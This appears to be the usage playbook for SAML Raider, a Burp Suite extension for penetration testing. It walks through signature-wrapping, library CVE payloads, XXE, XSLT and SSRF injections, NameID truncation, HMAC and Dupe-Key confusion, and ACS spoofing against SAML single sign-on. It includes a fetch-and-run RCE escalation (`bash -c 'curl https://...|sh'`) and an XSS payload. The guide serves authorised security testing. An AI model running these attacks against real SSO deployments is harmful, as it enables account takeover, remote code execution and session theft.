# SAML Raider — Attack Playbook

How to perform every attack this extension implements, end-to-end.

---

## Setup

1. Build the fat JAR: `./gradlew build` → `build/libs/SAMLRaider-*-all.jar`
2. In Burp: **Extensions → Add → Java → Select file…** → pick the JAR
3. Proxy a SAML flow through Burp. When the extension detects a `SAMLRequest` / `SAMLResponse` parameter or a WSS/SOAP body, a **SAML Raider** tab appears in the request/response editor.
4. If you need a certificate for re-signing, open the **SAML Raider Certificates** top-level tab.

**Tip — always do this first:** click **Store Certificate** on a captured signed response. That seeds the Certificates tab with the IdP's public cert, which you will clone for certificate-faking and Dupe-Key Confusion.

**Signature staleness indicator:** after any attack the panel shows **⚠ Stale signature — forward as-is to test SP signature validation, or re-sign above**. Most attacks deliberately invalidate the signature so you can probe whether the SP actually checks it. If the SP rejects, re-sign with a cloned cert and retry (see Signing section).

---

## Strategy — pick attacks in this order

1. **Recon** — click through the captured response; read Issuer, Destination, Conditions, AudienceRestriction in the info panel. If you have a `/metadata` URL, use **Import Metadata** to grab IdP certs.
2. **Cheapest kills first** — Signature Exclusion (Remove Signatures), Digest Tamper, Signature Exclusion + Multi-Assertion CVEs. These expose "sig-never-validated" misconfigs in seconds.
3. **Pre-auth parser attacks** — XXE, XSLT, SSRF variants. They fire *before* signature validation on many SPs, so they don't need a valid sig.
4. **Encrypted assertion attacks** — if you see `<EncryptedAssertion>`, head straight to Encryption SSRF.
5. **XSW family** — if the SP validates signatures, try XSW1–8 before moving to CVE payloads.
6. **Library-specific CVEs** — ruby-saml / crewjam / libxml2 stacks each have distinct payloads.
7. **Advanced signature attacks** — HMAC Confusion, Dupe Key Confusion. These need the original cert captured and some re-signing.
8. **Federation / multi-tenant** — Issuer Confusion, ACS Spoof, NameID tricks (comment/PI injection, XSS).

---

## Message row

### Reset Message
Restores the captured SAML message to its original state. Use between attacks so transforms don't stack accidentally.

### Format XML
Pretty-prints the XML. Cosmetic only — does not mutate the message.

---

## XSW — XML Signature Wrapping (rows: XSW)

**Target:** Signed Response *or* signed Assertion. **Prereq:** the message has a `<ds:Signature>`.

**Mechanism:** all 8 XSW variants exploit the gap between "what the signature verifier sees" (the signed, inner copy of the assertion) and "what the business logic consumes" (an attacker-inserted evil copy in a different location of the DOM). Different variants move the signed node to different hiding spots — `<Extensions>`, `<Object>`, as a sibling before/after, etc.

### XSW1–8
**Steps:**
1. Pick a variant from the dropdown (start with **XSW3** — highest hit rate).
2. **Preview in Browser...** — opens a diff view so you see exactly what changed.
3. **Apply XSW** — mutates the message.
4. Forward to SP. If SP processes the evil assertion as authentic, you'll see a session granted under the attacker's identity.
5. If XSW3 fails, walk through XSW1, 2, 4, 5, 6, 7, 8 in order — each corresponds to a different SP quirk (e.g., XSW7 hides in Extensions, XSW8 in Object).

**Oracle:** successful login / session cookie under the attacker's NameID.

### Match and Replace
Adds string-level rewrites applied *after* the XSW transform. Use this to swap the NameID in the evil assertion for the target user. Order matters — click **Match and Replace** → add `<old>` → `<new>` → then **Apply XSW**.

---

## CVE row — library-specific payloads

### CVE-2022-41912 (crewjam/saml, Go)
Appends an unsigned evil Assertion *after* the signed one. Vulnerable libraries only validate the first Assertion but process the last.
**Steps:** pick CVE-2022-41912 → **Apply CVE** → forward.
**Oracle:** login as the NameID in the appended evil assertion.

### CVE-2024-45409 (ruby-saml < 1.17.0)
Prepends an unsigned evil Assertion *before* the signed one. Ruby-saml's XPath iteration returns the first match.
**Steps:** pick CVE-2024-45409 → **Apply CVE** → forward.
**Oracle:** same as above but prepended.

### CVE-2025-23369 (GitHub Enterprise / libxml2)
Exploits libxml2's entity-ID redefinition quirk to make the `#id123` reference resolve to attacker-controlled DOM.
**Steps:** pick CVE-2025-23369 → **Apply CVE** → forward.
**Oracle:** signature validates against one element while the SP consumes another.

### CVE-2025-25291 / CVE-2025-25292 (ruby-saml parser differential)
DOCTYPE- and namespace-based parser-differential attacks — Nokogiri's DOM differs from REXML's, so the signed node and the consumed node diverge.
**Steps:** pick one → **Apply CVE** → forward.
**Oracle:** session granted under an identity that's in the attacker-visible DOM but not the signature-verified DOM.

**Help button:** click **?** next to the CVE dropdown for a full description of the selected CVE, including affected library versions and references.

---

## XML row — parser / signature-layer attacks

### Test XXE
**Target:** any SAML response. **Prereq:** SP's XML parser resolves external entities (many production parsers still do — especially older .NET and Java stacks).

**Steps:**
1. Click **Test XXE** → dialog opens.
2. **Burp Pro:** check **Use Burp Collaborator** (default).
3. **Community edition:** uncheck it and enter a custom OOB domain (`https://yourhost.example`).
4. Click OK → payload inserted at the top of the SAML XML.
5. Forward. Watch your Collaborator / OOB listener for inbound HTTP/DNS from the SP.

**Oracle:** inbound Collaborator hit = SP's XML parser is resolving external entities → probe further for file read / SSRF.

### Test XSLT
**Target:** signed message with `<ds:Transforms>` in the Reference (any enveloped XML signature has this).

**Three flavors in the dialog:**

#### Saxon `unparsed-text` (blind SSRF via XSLT 2.0)
Use against Saxon-backed XSLT 2.0 engines. Exfiltrates `/etc/passwd` via URL.
**Steps:** pick flavor → supply Collaborator URL → OK. Forward the message. Inbound Collaborator request tells you XSLT processed + what the URL encoded in.

#### Xalan `Runtime.exec` (Java RCE, xmlsec ≤ 1.4.1)
Use against older Java Santuario / ManageEngine ServiceDesk (CVE-2022-47966).
**Steps:** pick flavor. Field label flips to **Shell command:**. Enter the command you want executed, e.g. `curl https://collab.example/pwn`. OK. Forward.

**Oracle:** inbound Collaborator hit = RCE. (The XSLT response body may contain `java.lang.UNIXProcess@...` — that also confirms exec succeeded.)

#### Xalan DocumentHandler class instantiation (CVE-2014-0107)
Bypass of Xalan 2.7.2's secure-processing flag via `xalan:content-handler="com.sun.beans.decoder.DocumentHandler"`. Use against SPs that upgraded xmlsec but kept an old Xalan.
**Steps:** pick flavor → enter OOB URL (used by `xalan:entities`) → OK. Forward. Collaborator hit confirms class instantiation.

### KeyInfo SSRF
**Target:** signed message with `<ds:KeyInfo>`. **Prereq:** SP dereferences URIs in KeyInfo during validation (CVE-2021-40690 Santuario variants).

**Steps:**
1. Click **KeyInfo SSRF** → OOB dialog.
2. Supply Collaborator URL or custom domain.
3. OK. The `<X509Data>` inside `<KeyInfo>` is replaced with `<ds:RetrievalMethod URI="https://collab.example/" Type="...X509Data"/>`.
4. Forward.

**Oracle:** Collaborator hit = SP is fetching keys from attacker-controlled URLs during sig processing. This can be escalated to trust-override if you serve a fake cert at that URL.

### SigRef SSRF (three modes in the dropdown)

#### REFERENCE_URI
Swaps the `<ds:Reference URI="#id">` attribute with an external URL. SP fetches that URL to compute the digest.
**Steps:** pick mode → click button → supply Collaborator URL → OK.
**Oracle:** inbound HTTP = direct SSRF primitive (can be `file://` too, depending on stack).

#### XPATH_DOCUMENT
Injects a `<ds:Transform Algorithm=".../xpath">` containing `document('https://collab.example/')` *before* the existing c14n transform. Santuario versions without SecureValidation resolve XPath `document()`.
**Steps:** same as above.
**Oracle:** inbound hit = XPath SSRF primitive; can fetch attacker-controlled XML (e.g. to prep CVE-2014-0107 class instantiation).

#### BASE64_XXE
Prepends a Base64 transform whose decoded content is an XXE-laden XML document referencing the collaborator URL. Targets .NET CVE-2022-34716 — the XML signature code base64-decodes the transform input and re-parses it through a permissive XML reader.
**Steps:** pick mode → Collaborator URL → OK.
**Oracle:** inbound hit = .NET XML signature XXE confirmed.

---

## Inject row — value-level payload injection

### Comment Injection (CommentInjection)
Inject `<!---->` into the `NameID` text. Exclusive C14N strips comments *before* digest computation, so the signature stays valid while naive text extraction on the SP returns a truncated email. Covers Duo CVE-2017-11427/28/29/30.

**Position dropdown:**
- **Before @** — `admin<!---->@victim.com` — parser returns `admin`, enabling account takeover if the SP treats `admin` as a user ID.
- **After @** — `admin@<!---->victim.com` — parser returns `admin@`.
- **Prepend** — `<!---->admin@victim.com` — parser returns empty / anonymous.
- **Append** — least effective; included for completeness.

**Steps:** pick position → **Inject Comment** → forward.
**Oracle:** login as a different user than what's in the full NameID — often logs in as the admin of another tenant.

### PI Injection (PIInjection)
Same attack surface as Comment Injection but uses `<?x ?>` processing instructions instead of comments. Some parsers strip PIs differently from comments — the two variants catch different stacks.

**Steps:** same as Comment Injection but use the second dropdown + **Inject PI**.

### HMAC Confusion
Swaps `<SignatureMethod Algorithm=".../rsa-sha256"/>` to `hmac-sha256` and recomputes the HMAC using the SubjectPublicKeyInfo DER of the embedded cert as the HMAC key. If the SP doesn't enforce a signature-algorithm allowlist, it verifies the HMAC using the same public cert bytes as the HMAC key — which the attacker already knows. Covers CVE-2019-1006 class.

**Prereq:** message must embed an `<ds:X509Certificate>` in KeyInfo (true for virtually every real-world signed response).

**Steps:** **HMAC Confusion** button → forward.
**Oracle:** session granted despite no RSA signature. If rejected, the SP enforces algorithm pinning (good for them).

### Inject XSS
Reflects an XSS payload into `Destination`, `Issuer`, `NameID`, or `Audience`. Vulnerable SPs render the field into error pages without HTML-escaping *before* signature validation runs.

**Steps:**
1. **Inject XSS** → dialog opens.
2. Pick target field.
3. Default payload is `"><script>alert(1)</script>`. Edit if needed.
4. OK. DOM writes the payload; the serializer XML-escapes attribute entities for well-formedness (`&quot;`, `&lt;`) — the SP is expected to un-escape for HTML rendering, which is where the XSS fires.
5. Forward.

**Oracle:** XSS in the SP's error page (often `The assertion Destination "..." is invalid`).

### Confuse Issuer
Mutate the Issuer text with invisible or near-invisible characters to bypass string-equality IdP lookup on multi-tenant SPs (HackerOne #976603 pattern).

**Modes:**
- **Trailing space** (ASCII 0x20)
- **Trailing NBSP** (U+00A0)
- **Trailing ZWSP** (U+200B, zero-width)
- **Trailing Tab** (U+0009)
- **Homoglyph — Latin 'a' → Cyrillic 'а' (U+0430)**

**Steps:** pick mode → **Confuse Issuer** → forward.
**Oracle:** SP accepts the response as coming from a different IdP than the one actually named in Issuer. Useful when the attacker controls an IdP at a lookalike name.

---

## Manipulate row — assertion-level tampering

### Extend Validity +24h
Sets `NotBefore` to *now − 1h* (absorbs clock skew) and pushes `NotOnOrAfter` / `SessionNotOnOrAfter` forward 24h. Tests whether the SP enforces the validity window at all.

**Steps:** click **Extend Validity +24h** → forward (response is now stale-signed; see next).
**Typical combo:** apply Extend Validity, then re-sign with a cloned cert (see Signing). This replays a captured assertion beyond its natural expiry.

### Status → Success
Replaces every `<StatusCode Value>` with `urn:oasis:names:tc:SAML:2.0:status:Success`. Turns a failure response into a nominally-successful one.

**Steps:** click → forward.
**Oracle:** SPs that key on StatusCode alone may start a session even though no valid assertion was present.

### Remove Audience
Deletes every `<AudienceRestriction>` element. Tests whether the SP enforces audience matching.

**Steps:** click → forward.
**Oracle:** SPs with missing audience checks accept assertions intended for any relying party — useful for cross-tenant / cross-SP replay.

### Corrupt Digest
Flips the first base64 char of every `<ds:DigestValue>` but leaves `<SignatureValue>` and the `<Signature>` structure intact. Distinct from Remove Signatures — tests the "signature is present but never validated" misconfig (common in internal enterprise SSO that was dev-enabled once and never re-verified).

**Steps:** click → forward.
**Oracle:** session granted despite broken digest. Clean smoking gun for the report.

---

## Encryption row — XML Encryption SSRF (for `<EncryptedAssertion>`)

Typical SP flow decrypts *before* signature verification, so these SSRF primitives fire pre-auth.

### Enc SSRF (three modes)

#### CIPHER_REFERENCE
Replaces the first `<xenc:CipherValue>` (usually the wrapped session key inside `<EncryptedKey>`) with `<xenc:CipherReference URI="https://collab"/>`. SP fetches the URL to get ciphertext.
**Steps:** pick mode → button → Collaborator URL → OK. Forward.
**Oracle:** inbound Collaborator hit *during* auth = pre-auth SSRF.

#### DATA_REFERENCE
Injects `<xenc:ReferenceList><xenc:DataReference URI="https://collab"/></xenc:ReferenceList>` into the first `<EncryptedKey>`.
**Steps:** same as above.
**Oracle:** inbound hit = SP dereferences DataReference during key unwrap.

#### ENCRYPTED_KEY_KEYINFO
Replaces the inner `<ds:KeyInfo>` of the `<EncryptedKey>` with `<ds:RetrievalMethod>` pointing externally. SP fetches key material from the attacker during unwrap.
**Steps:** same as above.
**Oracle:** inbound hit = key-resolution SSRF; if combined with serving a fake wrapping key you may be able to forge the decrypted assertion.

---

## Request row — AuthnRequest-side attacks

### Spoof ACS URL (ACSSpoof)
**Target:** `<AuthnRequest>` (`SAMLRequest` parameter). **Prereq:** IdP does not strictly enforce registered ACS URL.

Rewrites `AssertionConsumerServiceURL` so the IdP delivers the SAMLResponse to attacker's server — leaks a valid signed assertion for the victim user.

**Steps:**
1. Intercept the SP → IdP redirect that contains the SAMLRequest.
2. Open the SAML Raider tab.
3. **Spoof ACS URL** → supply Collaborator URL or attacker host.
4. Forward. Victim auths to IdP as normal; IdP posts the signed response to attacker.

**Oracle:** attacker host receives a signed SAMLResponse for the victim's session.

### Import Metadata
Fetch or paste SAML metadata XML; extracts every `<ds:X509Certificate>` under `<md:KeyDescriptor>` and imports them into the Certificates tab.

**Steps:**
1. **Import Metadata** → dialog opens.
2. Either enter a metadata URL (e.g. `https://idp.example.com/metadata`) and click **Fetch**, or paste XML into the text area.
3. OK.
4. Switch to the **SAML Raider Certificates** top-level tab — the imported cert is there.

**Typical uses:**
- Cert-faking: clone the imported cert, self-sign with attacker key, re-sign assertions under the clone.
- Dupe-Key Confusion: needs the *original* cert bytes, which you get from here.

---

## Signing row

### Certificate dropdown
Select which certificate to sign with. Each cert with a private key is an option. Certs come from the Certificates tab — import, paste, or clone there first.

### (Re-)Sign Assertion / (Re-)Sign Message
After any attack that invalidates the signature, re-sign with a controlled cert.
- **Re-Sign Assertion** — signs the first Assertion.
- **Re-Sign Message** — signs the whole Response.
Pick whichever the SP validates.

**Typical combo:**
1. Capture original signed response → **Store Certificate** (seeds cert tab with IdP cert).
2. In Certificates tab, select that cert and **Clone Certificate** — generates a new cert with the same DN/issuer but an attacker-controlled private key. This defeats SPs that match the cert's subject / issuer strings instead of pinning the key.
3. Back in the SAML Raider tab, pick your cloned cert in the dropdown.
4. Apply any attack (XSW, Extend Validity, Remove Audience, etc.).
5. Click **(Re-)Sign Assertion**.
6. Forward.

**Oracle:** session granted. If SP only looked at cert subject, cloned-cert re-sign wins.

### Dupe Key Confusion
Black Hat 2019 .NET WIF / ADFS attack. Uses two different resolvers during signature processing — `ResolveSecurityKey` picks by key type (first match), `ResolveSecurityToken` picks by cert type. Plant attacker's RSAKeyValue first, original victim X509Certificate second. Signature verifies with attacker key; identity resolves to victim.

**Prereq:**
- The original response was captured *and already loaded* in the SAML Raider tab — the extension remembers the original X509 bytes automatically.
- An attacker cert with private key is selected in the Signing dropdown.

**Steps:**
1. Load the captured signed response into the SAML Raider tab.
2. In Certificates tab, ensure you have an attacker cert with a private key (create one via **Create Certificate** if needed).
3. Back in the SAML tab, select that attacker cert in the dropdown.
4. Click **Dupe Key Confusion**.
   - Internally: re-signs the assertion with the attacker key, then rewrites KeyInfo — prepends attacker's `<ds:RSAKeyValue>` and sets the `<ds:X509Certificate>` back to the original victim cert.
5. Forward. The signature *is* valid (under attacker key), and identity resolution returns the victim cert.

**Oracle:** session granted as any identity you want (you can combine with a prior Match-and-Replace on the NameID).

### Remove Signatures
Drops every `<ds:Signature>` element. Tests whether SP accepts unsigned responses (buggy "no signature = skip verification" defaults).

**Steps:** click → forward.
**Oracle:** session granted = sig check disabled. Report-worthy on its own.

### Store Certificate
Grabs the first `<ds:X509Certificate>` from the current SAML message and imports it into the Certificates tab. Use on a captured signed response to get the IdP's cert for cloning / Dupe-Key Confusion / metadata reference.

---

## Workflow cookbooks

### Sig-never-validated test (2 minutes)
1. **Corrupt Digest** → forward. If session: done.
2. **Remove Signatures** → forward. If session: done.
3. **HMAC Confusion** → forward. If session: algorithm not pinned.

### Cross-tenant takeover (multi-tenant SP)
1. **Confuse Issuer → Trailing Space** → forward.
2. If login lands in victim tenant, report IdP-confusion bypass.
3. Else try **Homoglyph** variant.

### NameID truncation
1. **Inject Comment → Before @**.
2. Forward. Log in as `admin` rather than `admin@victim.com`.
3. If blocked, try **Inject PI → Before @**.

### Pre-auth RCE hunt (Java SP)
1. **Test XSLT → Xalan Runtime.exec**, command = `curl https://collab.example/rce`.
2. Forward. Collaborator hit = RCE.
3. Escalate command to `bash -c 'curl https://...|sh'`.

### Encrypted-assertion pre-auth SSRF
1. **Enc SSRF → CIPHER_REFERENCE** + Collaborator URL → forward.
2. If no hit, try **ENCRYPTED_KEY_KEYINFO**.
3. Collaborator hit = SP decrypts attacker-controlled ciphertext pre-auth.

### Victim session hijack via ACS
1. Intercept the SAMLRequest.
2. **Spoof ACS URL** → your server.
3. Forward. Victim auths; your server receives the signed SAMLResponse.
4. Replay it against the real SP ACS endpoint.

### Cert-faking (original SAMLRaider workflow)
1. **Store Certificate** on captured response.
2. Certificates tab → select the stored cert → **Clone Certificate**.
3. Back to SAML tab → pick cloned cert in Signing dropdown.
4. Apply any mutation → **(Re-)Sign Message**.
5. Forward. If SP matches cert by subject/DN (not by pinned key), session granted.

---

## Troubleshooting

- **"This XML Message is not suitable for this particular XSW, is there a signature?"** — the response is unsigned. XSW needs a signature to wrap. Use Remove Signatures / Digest Tamper / Multi-Assertion CVEs instead.
- **"No X509Certificate found"** — the signed response embeds no cert (BYOC / pinned key). HMAC Confusion and Dupe Key Confusion won't work; try XSW or the CVE payloads.
- **"No Signature element found"** — the loaded message is not signed. Most Signing-row and SigRef-SSRF attacks need a sig. Load a signed message.
- **Stale signature warning won't clear** — click **Reset Message** or **(Re-)Sign Assertion**.
- **Collaborator unavailable** — you're on Community edition. Uncheck "Use Burp Collaborator" and supply your own OOB domain in the dialog.
- **Validity shifted but SP still rejects** — SP likely also validates the signature; re-sign after the Extend Validity click.
